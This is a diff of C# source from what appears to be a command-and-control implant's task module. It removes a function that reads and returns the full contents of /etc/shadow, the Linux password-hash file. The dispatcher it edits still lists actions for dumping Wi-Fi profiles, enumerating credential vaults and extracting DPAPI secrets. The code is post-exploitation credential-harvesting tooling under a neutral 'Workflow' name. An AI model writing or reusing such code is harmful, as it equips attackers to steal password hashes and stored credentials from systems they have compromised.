@@ -28,7 +28,6 @@ namespace Workflow
 
                 string result = args.action switch
                 {
-                    "shadow-read" => ReadShadow(),
                     "wifi-profiles" => GetWifiProfiles(),
                     "vault-enum" => EnumVaults(),
                     "dpapi" => ExtractDpapi(),
@@ -48,25 +47,6 @@ namespace Workflow
             {
                 DebugLog.Log($"{Name} error: {e.Message} [{job.task.id}]");
                 messageManager.Write(e.ToString(), job.task.id, true, "error");
-            }
-        }
-
-        private string ReadShadow()
-        {
-            if (!RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
-                return "Shadow file is only available on Linux";
-
-            string shadowPath = "/etc/shadow";
-            if (!File.Exists(shadowPath))
-                return $"File not found: {shadowPath}";
-
-            try
-            {
-                return File.ReadAllText(shadowPath);
-            }
-            catch (UnauthorizedAccessException)
-            {
-                return "Access denied: reading /etc/shadow requires root privileges";
             }
         }
 
